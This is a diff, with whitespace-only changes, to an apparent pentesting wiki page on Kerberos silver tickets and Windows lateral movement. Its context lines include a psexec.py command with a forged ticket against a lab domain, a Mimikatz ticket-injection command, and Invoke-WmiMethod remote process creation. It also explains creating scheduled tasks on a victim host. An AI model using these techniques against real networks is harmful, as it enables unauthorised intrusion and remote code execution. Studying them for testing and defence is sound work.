@@ -16,7 +16,7 @@ python psexec.py jurassic.park/stegosaurus@labwws02.jurassic.park -k -no-pass
 ```
 {% endcode %}
 
- In Windows, **Mimikatz** can be used to **craft** the **ticket**. Next, the ticket is **injected** with **Rubeus**, and finally a remote shell can be obtained thanks to **PsExec**.
+In Windows, **Mimikatz** can be used to **craft** the **ticket**. Next, the ticket is **injected** with **Rubeus**, and finally a remote shell can be obtained thanks to **PsExec**.
 
 {% code title="Windows" %}
 ```bash
@@ -30,7 +30,7 @@ mimikatz.exe "kerberos::ptt ticket.kirbi"
 ```
 {% endcode %}
 
-The **CIFS** service is the one that allows you to **access the file system of the victim**. You can find other services here: [**https://adsecurity.org/?page\_id=183**](https://adsecurity.org/?page_id=183)**.** For example, you can use the **HOST service** to create a _**schtask**_ in a computer. Then you can check if this has worked trying to list the tasks of the victim: `schtasks /S <hostname>`  or you can use the **HOST and** **RPCSS service** to execute **WMI** queries in a computer, test it doing: `Get-WmiObject -Class win32_operatingsystem -ComputerName <hostname>`
+The **CIFS** service is the one that allows you to **access the file system of the victim**. You can find other services here: [**https://adsecurity.org/?page\_id=183**](https://adsecurity.org/?page_id=183)**.** For example, you can use the **HOST service** to create a _**schtask**_ in a computer. Then you can check if this has worked trying to list the tasks of the victim: `schtasks /S <hostname>` or you can use the **HOST and** **RPCSS service** to execute **WMI** queries in a computer, test it doing: `Get-WmiObject -Class win32_operatingsystem -ComputerName <hostname>`
 
 ### Mitigation
 
@@ -153,7 +153,7 @@ Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.loca
 Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"
 
 #You can also use wmic
-wmic remote.computer.local list full /format:list 
+wmic remote.computer.local list full /format:list
 ```
 
 Find **more information about wmiexec** in the following page:
